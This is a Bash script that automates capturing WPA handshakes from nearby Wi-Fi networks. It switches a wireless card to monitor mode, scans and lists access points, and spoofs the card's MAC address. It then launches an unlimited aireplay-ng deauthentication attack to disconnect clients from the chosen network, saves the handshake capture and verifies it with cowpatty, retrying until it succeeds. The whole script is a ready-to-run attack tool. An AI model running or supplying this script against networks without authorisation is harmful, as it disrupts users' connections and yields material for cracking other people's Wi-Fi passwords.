#!/bin/bash
#
#********************************************************************
#Author:                QianSong
#QQ:                    xxxxxxxx
#Date:                  2022-09-13
#FileName：             handshakes_by_aireplay.sh
#URL:                   https://github.com
#Description：          The handshake wifi cap info script
#Copyright (C):         QianSong 2022 All rights reserved
#********************************************************************

#ding yi var
work_dir=$(dirname $(realpath $0))/temp_aireplay
result_dir=$(dirname $(realpath $0))/result

#pan duan work_dir shi  fou  cun  zai
if [ ! -d ${work_dir} ];then
	mkdir ${work_dir} -p
fi
#pan duan result_dir shi  fou  cun  zai
if [ ! -d ${result_dir} ];then
	mkdir ${result_dir} -p
fi

#===========================================================================================================================================
#======================                               xian shi  wlan0 info function                             ============================
#===========================================================================================================================================
function show_interface_list() {
#bao cun list to file
rm -rf ${work_dir}/interface_list.txt >/dev/null 2>&1
sleep 2
if_list=$(ip a|egrep "^[0-9]+" |awk -F ":" '{print $2}'|awk '{print $1}'|egrep -v "^lo$")
local i=1
for if_name in ${if_list}
do
	iface_num=$(airmon-ng|awk '/Interface/''{for(i=1; i<=NF; i++){print i " => " $i;}}'|grep "Interface"|awk '{print $1}')
	dri_num=$(airmon-ng|awk '/Driver/''{for(i=1; i<=NF; i++){print i " => " $i;}}'|grep "Driver"|awk '{print $1}')
	if_driver=$(airmon-ng|awk -v iface_num=${iface_num} -v if_name=${if_name} '{if($iface_num==if_name) {print $0}}'|awk -v dri_num=${dri_num} '{print $dri_num}')
	if_usb_id=$(cut -b 5-14 < "/sys/class/net/${if_name}/device/modalias" | sed 's/^.//;s/p/:/'|awk '{print tolower($1)}')
	if_chipest=$(lsusb|awk -v if_usb_id=${if_usb_id} '{if ($6==if_usb_id) {print $0}}'|head -n 1|awk '{for (i=7;i<=NF;i++) printf("%s ", $i); print ""}')
	#if_suport_band=
	echo -e "${i}., ${if_name}, driver: ${if_driver} chipest: ${if_chipest}" >> ${work_dir}/interface_list.txt
	let i++
done
#du qu list from file
while IFS=, read -r if_num if_name if_chipest; do
	echo -e "\033[32m${if_num} ${if_name}\033[0m ${if_chipest}"
done < "${work_dir}/interface_list.txt"
}

#===========================================================================================================================================
#======================                                select wlan card function                             ===============================
#===========================================================================================================================================
function select_interface() {
clear
show_interface_list
echo -ne "\033[33mPlease select one interface: \033[0m"
read inface_num
while true
do
	if [ -z "${inface_num}" ] || [ "${inface_num}" == "" ]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num can not be null\033[0m"
		echo -ne "\033[33mPlease select one interface: \033[0m"
		read inface_num
	elif [ "${inface_num}" == "0" ]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num can not be 0\033[0m"
		echo -ne "\033[33mPlease select one interface: \033[0m"
		read inface_num
	elif [[ ! "${inface_num}" =~ ^[0-9]+$ ]]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num must be a number type\033[0m"
		echo -ne "\033[33mPlease select one interface: \033[0m"
		read inface_num
	elif [ "${inface_num}" -gt $(cat "${work_dir}/interface_list.txt"|wc -l) ]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num must be less than the interface list total num\033[0m"
		echo -ne "\033[33mPlease select one interface: \033[0m"
		read inface_num
	else
		break
	fi
done

#=====================shu chu ni  de  xuan  zhe  jie  guo====================
wlan_card=$(cat "${work_dir}/interface_list.txt"|awk -F "," "NR==${inface_num}"'{print $2}'|awk '{print $1}')
airmon-ng | grep "${wlan_card}" >/dev/null 2>&1
card_check_status=$?
if [ ${card_check_status} -eq 0 ]; then
	echo -e "\033[35mYour selected interface is\033[0m \033[32m[${wlan_card}]\033[0m \033[35mbe suported\033[0m"
else
	echo -e "\033[35mYour selected interface is\033[0m \033[32m[${wlan_card}]\033[0m \033[31mnot be suported\033[0m"
	exit 5
fi
ip a |grep "${wlan_card}" >/dev/null 2>&1
interface_status=$?

#pan duan wang ka  shi  fou  kai qi jian  ting
if [ ${interface_status} -eq 0 ];then
	echo -e "\033[33mChecking interface ${wlan_card} work mode monitor.....\033[0m"
	iwconfig ${wlan_card}|grep "Mode:Monitor" >/dev/null 2>&1
	monitor_check=$?
	if [ ${monitor_check} -ne 0 ]; then
		echo -e "\033[31mCHECK FAILD\033[0m \033[35mStart interface to monintor mode...\033[0m"
		airmon-ng check kill
		check_kill=$?
		ip link set ${wlan_card} down
		if_down=$?
		iw dev ${wlan_card} set type monitor
		if_monitor=$?
		ip link set ${wlan_card} up
		if_up=$?	
		if [ ${check_kill} -eq 0 ] && [ ${if_down} -eq 0 ] && [ ${if_monitor} -eq 0 ] && [ ${if_up} -eq 0 ]; then
			echo -e "\033[32mSUCESS..\033[0m"
		else
			echo -e "\033[31mFALED..\033[0m"
			exit 6
		fi
	else
		echo -e "\033[32mCHECK OK\033[0m \033[35mThis interface ${wlan_card} already in monitor mode, continue !\033[0m"
	fi
else
	echo -e "\033[33mThere is no such device ${wlan_card}, please make sure that you plug in the device and work normally\033[0m"
	exit 7
fi
}

#===========================================================================================================================================
#========================                             sao miao all ap function                               ===============================
#===========================================================================================================================================
scan_all_ap() {
for i in 1
do
	rm -rf ${work_dir}/dump*
	sleep 2
	xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Scan all AP" -e airodump-ng ${wlan_card} --band $1 -w ${work_dir}/dump &
	echo $! >${work_dir}/airodump-ng.pid
	sleep 2
	mom_pid=$(cat ${work_dir}/airodump-ng.pid)
	child_pid=$(get_treepid ${mom_pid}|awk '{for(i = 1; i <= NF; i++) printf("%s%s", $i,"\n")}')
	mom_pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)
	while true
	do
		if [ ${mom_pid_sum} -gt 0 ]; then
			mom_pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)
			sleep 1
		else
			for iterm in ${child_pid}
			do
				kill ${iterm} >/dev/null 2>&1
			done
			break
		fi
	done
	sleep 2
done
}

#===========================================================================================================================================
#================                             chai fen  server_list and client_list function                               =================
#===========================================================================================================================================
prepare_server_client_list() {
rm -rf ${work_dir}/server_list.csv >/dev/null 2>&1
rm -rf ${work_dir}/client_list.csv >/dev/null 2>&1
rm -rf ${work_dir}/client.txt >/dev/null 2>&1
sleep 2
target_line=$(cat ${work_dir}/dump-01.csv|awk '/(^Station[s]?|^Client[es]?)/{print NR}')
target_line=$(awk -v target_line=${target_line} 'BEGIN{print target_line-1}')
cat ${work_dir}/dump-01.csv|head -n ${target_line}|dos2unix|egrep -v --text "^$" > "${work_dir}/server_list.csv"
cat ${work_dir}/dump-01.csv|tail -n +${target_line}|dos2unix|egrep -v --text "^$" > "${work_dir}/client_list.csv"

#zhun bei sniff client list
echo -e "server_mac,server_name" >> "${work_dir}/client.txt"
while IFS=, read -r _ _ _ _ _ server_mac server_name; do
	server_mac_char=${#server_mac}
	if [ ${server_mac_char} -ge 17 ]; then
		server_mac=$(echo ${server_mac} | awk '{gsub(/ /,""); print}')
		echo -e "${server_mac},${server_name}" >> "${work_dir}/client.txt"
	fi
done < "${work_dir}/client_list.csv"
sleep 2
}

#===========================================================================================================================================
#====================                                   xian shi sao miao jie guo function                         =========================
#===========================================================================================================================================
display_result_info() {
server_list_total=$(cat ${work_dir}/server_list.csv|egrep --text -v "^$"|sed -r '1d'|awk -F "," '{if (length($1) >= 17) {print $0}}'|wc -l)
if [ ${server_list_total} -gt 0 ]; then
	echo -e "\033[32m 序号         BSSID        信道     信号强度     加密方式      ESSID\033[0m"
	local i=0
	local valid_channels_24_and_5_ghz_regexp="[0-9]{1,3}"
	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ exp_auth exp_power _ _ _ exp_idlength exp_essid _; do

		chars_mac=${#exp_mac}
		if [ "${chars_mac}" -ge 17 ]; then
			i=$((i + 1))
			if [ "${exp_power}" -lt 0 ]; then
				if [ "${exp_power}" -eq -1 ]; then
					exp_power=0
				else
					exp_power=$((exp_power + 100))
				fi
			fi

			exp_power=$(echo "${exp_power}" | awk '{gsub(/ /,""); print}')
			exp_essid=${exp_essid:1:${exp_idlength}}

			if [[ ${exp_channel} =~ ${valid_channels_24_and_5_ghz_regexp} ]]; then
				exp_channel=$(echo "${exp_channel}" | awk '{gsub(/ /,""); print}')
			else
				exp_channel=0
			fi

			if [[ "${exp_essid}" = "" ]] || [[ -z "${exp_essid}" ]]; then
				exp_essid="(Hidden Network)"
			fi

			exp_enc=$(echo "${exp_enc}" | awk '{print $1}')

			if [ "${i}" -le 9 ]; then
				sp1="  "
			elif [[ "${i}" -ge 10 ]] && [[ "${i}" -le 99 ]]; then
				sp1=" "
			else
				sp1=""
			fi

			if [ "${exp_channel}" -le 9 ]; then
				sp2="  "
				if [ "${exp_channel}" -eq 0 ]; then
					exp_channel="-1"
				fi
				if [ "${exp_channel}" -lt 0 ]; then
					sp2=" "
				fi
			elif [[ "${exp_channel}" -ge 10 ]] && [[ "${exp_channel}" -lt 99 ]]; then
				sp2=" "
			else
				sp2=""
			fi

			if [ "${exp_power}" = "" ]; then
				exp_power=0
			fi

			if [ "${exp_power}" -le 9 ]; then
				sp4=" "
			else
				sp4=""
			fi

			airodump_color="\033[37m"
			normal_color="\033[0m"
			client=$(grep "${exp_mac}" < "${work_dir}/client.txt")
			if [ "${client}" != "" ]; then
				airodump_color="\033[33m"
				client="*"
				sp5=""
			else
				sp5=" "
			fi

			enc_length=${#exp_enc}
			if [ "${enc_length}" -gt 3 ]; then
				sp6=""
			elif [ "${enc_length}" -eq 0 ]; then
				sp6="    "
			else
				sp6=" "
			fi

			echo -e "${airodump_color}${sp1}[${i}]${client}   ${sp5}${exp_mac}  ${sp2}${exp_channel}        ${sp4}${exp_power}%          ${exp_enc}${sp6}       ${exp_essid}${normal_color}"
		fi
	done < "${work_dir}/server_list.csv"

	#IFS=$'\n'
	#a=1
	#for i in $(cat ${work_dir}/server_list.csv|egrep --text -v "^$"|sed -r '1d'|awk -F "," '{if (length($1) >= 17) {print $0}}')
	#do
	#	temp_mac=$(echo ${i}|awk -F "," '{print $1}')
	#	cat ${work_dir}/client.txt|grep --text ${temp_mac} >/dev/null 2>&1
	#	client_stat=$?
	#	if [ "${client_stat}" == "0" ]; then
	#		echo -e "\033[33m[$a]\033[0m \033[32m$i\033[0m"
	#	else
	#		echo -e "\033[33m[$a]\033[0m $i"
	#	fi
	#	let a++
	#done
else
	echo -e "\033[31mNo network at the list, press [enter] to restart new hack\033[0m"
	read -p ">" you_zl
	handshake_menu
fi
}

#===========================================================================================================================================
#============================                          xiu gai wlan car mac addr function                        ===========================
#===========================================================================================================================================
changer_mac_addr() {
ip link set ${wlan_card} down >/dev/null 2>&1
macchanger -r ${wlan_card} >/dev/null 2>&1
ip link set ${wlan_card} up >/dev/null 2>&1
}

#===========================================================================================================================================
#=====================                                  handshake 2.4g and 5g function                              ========================
#===========================================================================================================================================
handshake_bga() {
#shao  miao   wifi  into  text wifi_info.txt
echo "starting scan wifi info into ${work_dir}/dump-01.csv...."

#shu chu cao zuo ti shi info
echo -e "\n"
echo -e "\033[33m提示：当目标WiFi出现了，请手动关掉扫描窗口进入下一步！\033[0m"
scan_all_ap $1

#xian shi sao  miao  jie  guo
dos2unix ${work_dir}/dump-01.csv >/dev/null 2>&1
prepare_server_client_list
clear
display_result_info

#xuan zhe yi  ge  xin hao
read -p "Select one AP what you want to handshake [num]: " ap_num
while true
do
	if [ -z ${ap_num} ]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num must be a number and can not be null!!\033[0m"
		read -p "Select one AP what you want to handshake [num]: " ap_num
	elif [[ ! ${ap_num} =~ ^[0-9]+$ ]]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num must be a number and can not be null!!\033[0m"
		read -p "Select one AP what you want to handshake [num]: " ap_num
	elif [ ${ap_num} -gt $(cat ${work_dir}/server_list.csv|egrep --text -v "^$"|sed -r '1d'|awk -F "," '{if (length($1) >= 17) {print $0}}'|wc -l) ]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num con't be great of total number for ap list!!\033[0m"
		read -p "Select one AP what you want to handshake [num]: " ap_num
	elif [ ${ap_num} -eq 0 ]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num is must be great of 0!!\033[0m"
		read -p "Select one AP what you want to handshake [num]: " ap_num
	else
		break
	fi
done

#ding yi mu biao  AP mac and xin dao
target_mac=$(cat ${work_dir}/server_list.csv|egrep --text -v "^$"|sed -r '1d'|awk -F "," '{if (length($1) >= 17) {print $0}}'|awk -F "," "NR==${ap_num}"'{print $1}')
if [ -z ${target_mac} ] || [ "${target_mac}" == "" ]; then
	echo -e "\033[31mThe target ap mac is null ,now program is exit.\033[0m"
	exit 8
fi
target_ap_name=$(cat ${work_dir}/server_list.csv|grep --text "${target_mac}"|awk -F "," '{if (NF>1) {print $(NF-1)}}'|awk '{print $1}')
cur_channel=$(cat ${work_dir}/server_list.csv|grep --text "${target_mac}"|awk '{print $6}'|awk -F "," '{print $1}'|egrep -v "^0$"|egrep -v "-"|egrep -v "[0-9]+e"|sort|uniq -c|sort -nk 1|tail -n 1|awk "NR==1"'{print $2}')

#kai qi  zhua  bao  xterm
if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
	echo -e "\033[35mThe handshake program xterm have started.\033[0m"
	sleep 1
	for i in 1
	do
		rm -rf ${result_dir}/${target_mac//:/-}*
		sleep 2
		changer_mac_addr
		xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${target_mac}" -e airodump-ng --ignore-negative-one -d ${target_mac} -w ${result_dir}/${target_mac//:/-} -c ${cur_channel} -a ${wlan_card} &
		echo $! >${work_dir}/airodump-ng.pid
		sleep 2
	done
else
	echo -e "\033[35mThe handshake program xterm have started.\033[0m"
	sleep 1
	for i in 1
	do
		rm -rf ${result_dir}/${target_ap_name}-${target_mac//:/-}*
		sleep 2
		changer_mac_addr
		xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${target_mac}" -e airodump-ng --ignore-negative-one -d ${target_mac} -w ${result_dir}/${target_ap_name}-${target_mac//:/-} -c ${cur_channel} -a ${wlan_card} &
		echo $! >${work_dir}/airodump-ng.pid
		sleep 2
	done
fi

#kai qi gon ji aireplay-ng xterm
iw dev ${wlan_card} set channel ${cur_channel} >/dev/null 2>&1
xterm -geometry "85+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${target_mac}" -e aireplay-ng -0 0 -a ${target_mac} --ignore-negative-one ${wlan_card} &
echo $! >${work_dir}/aireplay-ng.pid
sleep 2

#shu chu cao zuo ti shi info
echo -e "\n"
echo -e "\033[33m提示：当目标WiFi握手包出现了，请手动关掉抓包窗口进入下一步！\033[0m"

#guan bi gon ji xterm
sleep 15
echo -e "\033[32mClose the aireplay-ng attack xterm...\033[0m"
mom_pid=$(cat ${work_dir}/aireplay-ng.pid)
child_pid=$(get_treepid ${mom_pid}|awk '{for(i = 1; i <= NF; i++) printf("%s%s", $i,"\n")}')
kill "${mom_pid}" >/dev/null 2>&1
mom_pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)
while true
do
	if [ ${mom_pid_sum} -gt 0 ]; then
		mom_pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)
		sleep 1
	else
		for iterm in ${child_pid}
		do
			kill ${iterm} >/dev/null 2>&1
		done
		break
	fi
done
sleep 2

#guan bi handshake pid de jian ting program
i=1
mom_pid=$(cat ${work_dir}/airodump-ng.pid)
child_pid=$(get_treepid ${mom_pid}|awk '{for(i = 1; i <= NF; i++) printf("%s%s", $i,"\n")}')
mom_pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)
while true
do
	if [ ${mom_pid_sum} -gt 0 ]; then
		mom_pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)
		echo -n "Now ${i} seconds has passd.."
		echo -ne "\r\r"
		sleep 1
		let i+=1
	else
		for iterm in ${child_pid}
		do
			kill ${iterm} >/dev/null 2>&1
		done
		break
	fi
done
sleep 2
}

#===========================================================================================================================================
#=======================                                    check handshake fuction                                 ========================
#===========================================================================================================================================
handshake_check() {
if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
	echo -e "\033[35mChecking handshake \033[34m[${result_dir}/${target_mac//:/-}-01.cap]\033[0m \033[35m....\033[0m"
	sleep 3
	cowpatty -c -r ${result_dir}/${target_mac//:/-}-01.cap >/dev/null 2>&1
	exit_code=$?
	if [ ${exit_code} -eq 0 ]; then
		echo -e "\033[32mThe target handshake \033[34m[${result_dir}/${target_mac//:/-}-01.cap]\033[0m \033[32mcheck sucessfully \033[0m"
		return 0
	else
		echo -e "\033[31mThe target handshake \033[34m[${result_dir}/${target_mac//:/-}-01.cap]\033[0m \033[31mcheck faild \033[0m"
		return 1
	fi
else
	echo -e "\033[35mChecking handshake \033[34m[${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap]\033[0m \033[35m....\033[0m"
	sleep 3
	cowpatty -c -r ${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap >/dev/null 2>&1
	exit_code=$?
	if [ ${exit_code} -eq 0 ]; then
		echo -e "\033[32mThe target handshake \033[34m[${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap]\033[0m \033[32mcheck sucessfully \033[0m"
		return 0
	else
		echo -e "\033[31mThe target handshake \033[34m[${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap]\033[0m \033[31mcheck faild \033[0m"
		return 1
	fi
fi
}

#===========================================================================================================================================
#========================                                    xian shi jie guo info function                        =========================
#===========================================================================================================================================
display_cap_location() {
if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
	echo -e "\033[36mThe handshake cap is saved in [${result_dir}/${target_mac//:/-}-01.cap] \033[0m"
	exit 0
else
	echo -e "\033[36mThe handshake cap is saved in [${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap] \033[0m"
	exit 0
fi
}

#===========================================================================================================================================
#===============================                               xuan zhe gon ji mode                       ==================================
#===========================================================================================================================================
handshake_menu() {
echo -e "\033[33mSelect one type what you want to handshake\033[0m"
echo -e "\033[36m************************************\033[0m"
echo -e "\033[31m0.        return tool select\033[0m       \033[36m*\033[0m"
echo -e "\033[36m************************************\033[0m"
echo -e "\033[32m1.        2.4G\033[0m                     \033[36m*\033[0m"
echo -e "\033[32m2.        5G\033[0m                       \033[36m*\033[0m"
echo -e "\033[36m************************************\033[0m"
read -p "Please select: " hand_type
case ${hand_type} in
	0)
		clear
		handshake_tool_menu
		;;
	1)
		clear
		select_interface
		handshake_bga bg
		handshake_check
		exit_code=$?
		while [ ${exit_code} -ne 0 ]
		do
			echo -e "\033[35mRestart handshake program and rechecking....\033[0m"
			sleep 3
			handshake_bga bg
			handshake_check
			exit_code=$?
		done
		display_cap_location
		;;
	2)
		clear
		select_interface
		handshake_bga a
		handshake_check
		exit_code=$?
		while [ ${exit_code} -ne 0 ]
		do
			echo -e "\033[35Restart handshake program and rechecking....\033[0m"
			sleep 3
			handshake_bga a
			handshake_check
			exit_code=$?
		done
		display_cap_location
		;;
	*)
		clear
		handshake_menu
		;;
esac
}

#function ru kou
handshake_menu
